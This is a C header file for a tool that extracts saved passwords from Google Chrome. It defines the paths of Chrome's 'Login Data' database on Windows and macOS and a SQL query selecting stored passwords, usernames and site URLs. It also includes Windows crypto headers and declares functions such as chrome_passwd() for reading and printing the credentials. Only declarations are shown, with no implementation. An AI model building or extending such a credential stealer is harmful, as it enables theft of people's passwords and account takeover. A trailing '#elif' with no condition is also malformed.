#ifndef _READER_H_
#define _READER_H_

#ifdef _WIN32
#include <windef.h>
#include <winsock2.h>
#include "winbase.h"
#include "wincrypt.h"
#define PATH "C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
#define TMP "C:/chrome_logins"
#elif __APPLE__
#define PATH "/Users/%s/Library/Application Support/Google/Chrome/Default/Login Data"
#define TMP "/tmp/chrome_logins"
#elif __linux__
#define PATH ""
#elif
#define PATH ""
#endif

#include "../deps/sqlite3.h"
#define QUERY "SELECT password_value, username_value, origin_url FROM logins"

void path(char** path); 
void printdata(sqlite3_stmt* stmHandle, unsigned int id, unsigned char *pwd);
void cutPage(char* str, const char* value);
char *chrome_passwd();
int readdata();

#endif
